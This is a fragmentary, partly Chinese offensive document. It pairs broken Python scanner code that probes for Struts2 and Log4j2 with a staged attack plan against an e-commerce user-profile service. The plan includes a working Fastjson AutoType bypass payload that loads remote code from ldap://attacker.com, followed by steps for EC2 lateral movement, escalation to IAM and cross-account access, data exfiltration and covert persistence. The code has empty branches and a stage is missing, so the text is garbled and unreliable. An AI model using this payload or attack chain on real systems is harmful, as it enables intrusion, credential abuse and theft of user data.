        results = []

        for component in target.tech_stack:
            if component == 'fastjson':

            elif component == 'struts2':
                results.extend(self.probe_struts2(target))
            elif component == 'log4j2':
                results.extend(self.probe_log4j(target))

        # 基于业务功能的探测
        for endpoint in target.api_endpoints:

            if 'template' in endpoint or 'render' in endpoint:

        return results

text
第1阶段：漏洞发现
- 目标：某电商平台用户画像服务
- 漏洞：Fastjson ≤1.2.68 AutoType绕过
- Payload: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit"}
第2阶段：初始访问
- 获得应用服务器权限

第4阶段：横向移动
- 使用凭证枚举所有EC2实例
- 发现管理后台服务器

第5阶段：持久化与数据访问

：从应用权限→IAM角色→跨账户权限  
  
1. **数据流追踪**  
：用户请求→应用日志→数据库访问→数据外传  
  
1. **隐蔽持久化**  
：内存驻留+合法云服务滥用
